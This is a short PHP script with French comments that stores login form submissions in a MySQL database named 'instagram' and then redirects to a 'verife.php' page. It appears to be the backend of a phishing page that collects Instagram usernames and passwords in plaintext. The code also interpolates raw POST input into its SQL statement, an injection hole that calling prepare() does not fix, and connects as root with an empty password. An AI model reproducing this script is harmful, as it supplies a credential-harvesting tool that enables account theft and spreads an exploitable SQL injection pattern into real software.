<?php
// Informations de connexion à la base de données
$servername = "localhost"; // Votre serveur de base de données
$username = "root"; // Votre nom d'utilisateur MySQL
$password = ""; // Votre mot de passe MySQL
$dbname = "instagram"; // Votre nom de base de données

// Créer une connexion à la base de données
$conn = new mysqli($servername, $username, $password, $dbname);

// Vérifier la connexion
if ($conn->connect_error) {
    die("Connexion échouée: " . $conn->connect_error);
}

// Récupérer les données envoyées par le formulaire
$user_email = $_POST['username'];
$user_password = $_POST['password'];

// Requête SQL pour insérer l'utilisateur dans la table
$sql = "INSERT INTO users (email, passcode) VALUES ('$user_email', '$user_password')";

// Préparer la requête (sans bind_param)
$stmt = $conn->prepare($sql);

// Vérifiez si la préparation a échoué
if ($stmt === false) {
    die("Erreur dans la préparation de la requête : " . $conn->error);
}

// Exécuter la requête
if ($stmt->execute()) {
    echo "Utilisateur ajouté avec succès !";
    header("location:verife.php");
} else {
    echo "Erreur: " . $stmt->error;
}

// Fermer la connexion
$stmt->close();
$conn->close();
?>
